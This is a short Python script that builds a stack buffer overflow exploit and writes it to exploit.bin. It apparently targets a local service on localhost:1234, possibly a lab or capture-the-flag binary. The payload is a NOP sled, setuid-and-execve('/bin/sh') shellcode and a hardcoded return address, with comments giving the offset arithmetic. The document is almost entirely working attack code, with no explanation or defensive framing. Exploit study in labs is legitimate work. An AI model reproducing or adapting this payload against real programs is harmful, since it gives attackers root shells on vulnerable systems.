
SERVER = "localhost"
PORT = 1234 


menu_option = b"1\n"
offset = b"A"* 72
shellcode = b"\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
nopadd = b"\x90"*19
rip_add = b"\xf5\x00\xe2\xf7\xff\x7f"

# BUFER = 72
# SHELLCODE = 53
# NOP = 72 - 53 = 19 bytes
# Return address = 6 bytes 
# RIP 0x7ffff7e200f5
# NOP = 0x90

exploit = nopadd + shellcode + rip_add

f = open("exploit.bin", "wb")
f.write(exploit)
f.close()
print(exploit)
